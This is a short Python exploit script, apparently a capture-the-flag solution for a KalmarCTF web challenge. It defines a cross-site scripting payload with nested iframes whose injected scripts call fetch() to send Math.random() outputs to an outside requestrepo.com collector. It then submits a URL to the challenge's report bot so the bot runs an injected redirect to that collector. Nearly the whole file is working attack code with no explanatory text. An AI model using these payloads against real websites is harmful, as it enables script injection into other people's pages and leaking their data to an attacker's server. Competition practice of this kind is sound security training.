import requests, urllib.parse

REQUESTREPO = "https://4rl8zudr.requestrepo.com"
HOST = "https://bot-spukhafte.chal-kalmarc.tf/"

xss_payload = """
<div id="container"></div>
<script>
const inner = `
<iframe id=a></iframe>
<iframe id=b></iframe>
<script>
a.srcdoc='<script>fetch("REQUESTREPO/?a_"+([Math.random(),Math.random(),Math.random(),Math.random()].toString()))</scr'+'ipt>';
b.srcdoc='<script>fetch("REQUESTREPO/?b_"+([Math.random(),Math.random(),Math.random(),Math.random()].toString()))</scr'+'ipt>';
</scr${""}ipt>
`;

setTimeout(() => {
  const frame = document.createElement("iframe");
  frame.src = "https://xss-spukhafte.chal-kalmarc.tf/?html=" + encodeURIComponent(inner);
  document.getElementById("container").appendChild(frame);
}, 2000);
</script>
""".replace("REQUESTREPO", REQUESTREPO)
# put ^ on that requestrepo, or host a server, idk

r = requests.post(HOST + "/report", json={"url": "https://xss-spukhafte.chal-kalmarc.tf/?html=" + urllib.parse.quote(f"<script>window.location.href='{REQUESTREPO}/';</script>")})
print(r, r.text)
